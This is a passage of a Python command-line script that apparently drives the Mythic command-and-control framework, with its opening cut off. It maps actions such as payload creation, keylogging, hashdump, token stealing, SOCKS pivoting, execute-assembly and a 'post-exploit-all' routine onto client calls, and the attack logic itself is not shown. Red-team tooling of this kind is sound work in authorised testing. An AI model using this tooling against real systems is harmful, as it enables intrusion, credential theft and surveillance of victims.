            result = mythic.create_payload(
                agent=args.agent,
                target_os=args.target_os,
                arch=args.arch,
                c2_profile=args.c2_profile,
                commands=args.commands,
                filename=args.filename,
            )

        elif action == "download-payload":
            if not args.payload_uuid:
                result = {"status": "error", "error": "--payload-uuid required"}
            else:
                result = mythic.download_payload(args.payload_uuid)

        elif action == "list-callbacks":
            result = mythic.list_callbacks()

        elif action == "callback-info":
            if not args.callback_id:
                result = {"status": "error", "error": "--callback-id required"}
            else:
                result = mythic.get_callback_info(args.callback_id)

        elif action == "task":
            if not args.callback_id or not args.command:
                result = {"status": "error", "error": "--callback-id and --command required"}
            else:
                result = mythic.task_and_wait(args.callback_id, args.command, args.params, args.timeout)

        elif action == "task-output":
            if not args.task_id:
                result = {"status": "error", "error": "--task-id required"}
            else:
                result = mythic.get_task_output(args.task_id, args.timeout)

        elif action == "file-browser":
            if not args.callback_id:
                result = {"status": "error", "error": "--callback-id required"}
            else:
                result = mythic.file_browser(args.callback_id, args.path)

        elif action == "screenshot":
            if not args.callback_id:
                result = {"status": "error", "error": "--callback-id required"}
            else:
                result = mythic.screenshot(args.callback_id)

        elif action == "keylog":
            if not args.callback_id:
                result = {"status": "error", "error": "--callback-id required"}
            else:
                result = mythic.keylog(args.callback_id, args.target_pid)

        elif action == "hashdump":
            if not args.callback_id:
                result = {"status": "error", "error": "--callback-id required"}
            else:
                result = mythic.hashdump(args.callback_id)

        elif action == "start-socks":
            if not args.callback_id:
                result = {"status": "error", "error": "--callback-id required"}
            else:
                result = mythic.start_socks(args.callback_id, args.port)

        elif action == "stop-socks":
            if not args.callback_id:
                result = {"status": "error", "error": "--callback-id required"}
            else:
                result = mythic.stop_socks(args.callback_id)

        elif action == "execute-assembly":
            if not args.callback_id or not args.assembly:
                result = {"status": "error", "error": "--callback-id and --assembly required"}
            else:
                result = mythic.execute_assembly(args.callback_id, args.assembly, args.assembly_args)

        elif action == "execute-bof":
            if not args.callback_id or not args.bof_file:
                result = {"status": "error", "error": "--callback-id and --bof-file required"}
            else:
                result = mythic.execute_bof(args.callback_id, args.bof_file, args.bof_function)

        elif action == "link":
            if not args.callback_id or not args.link_host:
                result = {"status": "error", "error": "--callback-id and --link-host required"}
            else:
                result = mythic.link_agent(args.callback_id, args.link_host, args.link_c2)

        elif action == "download":
            if not args.callback_id or not args.remote_path:
                result = {"status": "error", "error": "--callback-id and --remote-path required"}
            else:
                result = mythic.download_file(args.callback_id, args.remote_path)

        elif action == "steal-token":
            if not args.callback_id or not args.target_pid:
                result = {"status": "error", "error": "--callback-id and --target-pid required"}
            else:
                result = mythic.steal_token(args.callback_id, args.target_pid)

        elif action == "make-token":
            if not args.callback_id or not all([args.token_domain, args.token_user, args.token_password]):
                result = {"status": "error", "error": "--callback-id, --token-domain, --token-user, --token-password required"}
            else:
                result = mythic.make_token(args.callback_id, args.token_domain, args.token_user, args.token_password)

        elif action == "rev2self":
            if not args.callback_id:
                result = {"status": "error", "error": "--callback-id required"}
            else:
                result = mythic.rev2self(args.callback_id)

        elif action == "post-exploit-all":
            if not args.callback_id:
                result = {"status": "error", "error": "--callback-id required"}
            else:
                result = mythic.post_exploit_all(args.callback_id)

        elif action == "cleanup":
            result = mythic.cleanup()

        else:
            result = {"status": "error", "error": f"Unknown action: {action}"}

    # Output
    if args.json:
        print(json.dumps(result, indent=2, default=str))
    else:
        status = result.get("status", "unknown")
        if status in ("error", "unreachable"):
            print(f"[-] Error: {result.get('error', 'unknown')}", file=sys.stderr)
            sys.exit(1)
        else:
            print(f"[+] Action '{action}' completed: {status}")
            if isinstance(result, dict):
                for key, value in sorted(result.items()):
                    if key in ("status", "action"):
                        continue
                    if isinstance(value, (str, int, float, bool)):
                        print(f"    {key}: {value}")
                    elif isinstance(value, list):
                        print(f"    {key}: {len(value)} items")
                    elif isinstance(value, dict):
                        if "error" in value:
                            print(f"    {key}: ERROR — {value['error']}")
                        else:
                            print(f"    {key}: {len(value)} fields")


if __name__ == "__main__":
    main()
